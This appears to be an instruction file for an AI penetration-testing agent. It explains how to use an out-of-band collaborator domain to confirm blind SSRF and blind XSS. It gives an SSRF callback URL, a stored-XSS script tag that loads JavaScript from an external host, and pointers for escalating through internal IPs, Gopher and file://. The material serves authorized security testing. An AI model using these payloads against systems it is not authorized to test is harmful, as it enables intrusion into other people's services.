# Lancer OAST Collaborator

Use this skill when testing for blind Server-Side Request Forgery (SSRF),
blind XSS, or any out-of-band vulnerability that requires an external
callback to detect.

## What is the Lancer OAST Collaborator?

The Lancer OAST (Out-of-Band Application Security Testing) collaborator is
an always-on listener managed by Lancer. It provides a unique domain per
scan that you can inject into payloads. When the target makes a DNS, HTTP,
or SMTP connection to this domain, Lancer records the interaction and
correlates it back to the attack step that triggered it.

## How to get your collaborator domain

The OAST domain is available in the environment variable `LANCER_OAST_DOMAIN`.
Read it at the start of your scan:

```python
import os
oast_domain = os.environ.get("LANCER_OAST_DOMAIN", "")
if not oast_domain:
    print("WARNING: LANCER_OAST_DOMAIN not set — blind SSRF detection disabled")
```

## SSRF testing with the collaborator

For every URL parameter, header, and JSON field that takes a URL or hostname:

1. Inject `http://<payload-id>.<oast_domain>/ssrf` where `payload-id` is a
   short unique identifier you choose (e.g. `user-avatar-123`).
2. Send the request via the browser or terminal tool.
3. Check `http://lancer-api/api/oast/hits?domain=<payload-id>.<oast_domain>`
   to see if a DNS or HTTP hit was recorded.
4. If a hit is recorded, you have a confirmed blind SSRF — proceed to escalate
   (redirect to internal IPs, Gopher protocol, file:// etc.)

## Blind XSS testing with the collaborator

For every stored text field (profile name, address, comment, ticket subject):

1. Inject `"><script src="http://<payload-id>.<oast_domain>/xss.js"></script>`
2. Navigate (as admin if possible) to where the stored value is rendered.
3. Check the OAST hits endpoint for HTTP requests from a browser user-agent.

## Checking for OAST hits

Use the Python tool to poll Lancer's OAST hit API:

```python
import requests, os, time

lancer_api = os.environ.get("LANCER_API", "http://127.0.0.1:9090")
oast_domain = os.environ.get("LANCER_OAST_DOMAIN", "")

# Poll for up to 30 seconds
for _ in range(6):
    r = requests.get(f"{lancer_api}/api/oast/hits", params={"domain": oast_domain})
    hits = r.json().get("hits", [])
    if hits:
        print("OAST hit received!", hits)
        break
    time.sleep(5)
```

## Reporting blind vulnerabilities

When an OAST hit confirms a blind vulnerability, use `create_vulnerability_report`
with:
- The injected payload as `poc_request`
- The OAST hit JSON (from Lancer API) as `poc_response`
- CVSS score appropriate for SSRF or stored XSS (typically 7.0–9.8)

Never report a blind vulnerability without a confirmed OAST hit — false
positives waste everyone's time and damage your reputation on bug bounty.
